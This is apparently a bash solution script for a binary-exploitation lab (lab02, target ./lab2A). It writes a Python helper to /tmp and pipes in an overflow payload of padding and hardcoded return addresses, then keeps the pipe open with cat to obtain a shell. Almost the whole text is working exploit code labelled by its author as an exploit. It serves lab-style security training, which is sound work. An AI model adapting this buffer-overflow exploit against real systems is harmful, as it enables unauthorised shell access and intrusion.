#!/bin/bash

# This below is a buffer packing script/exploit.
cat <<EOF>/tmp/exp.py
#!/usr/bin/python
import sys

def construct(buf):
    out = ''
    for b in buf:
        s = b + "Z" * 12 + "\n" 
        out += s
    return out

buf = 'A' * 20
if len(sys.argv) > 1:
    buf = sys.argv[1]

sys.stdout.write(construct(buf))
EOF

cd /levels/lab02
echo "Remember to press ^M to escape from 'cat' to get to the shell!"
(/tmp/exp.py $(python -c 'print "A"*20 + "\x10\xf0\xff\xbf" + "\xfd\x86\x04\x08"'); cat) | ./lab2A
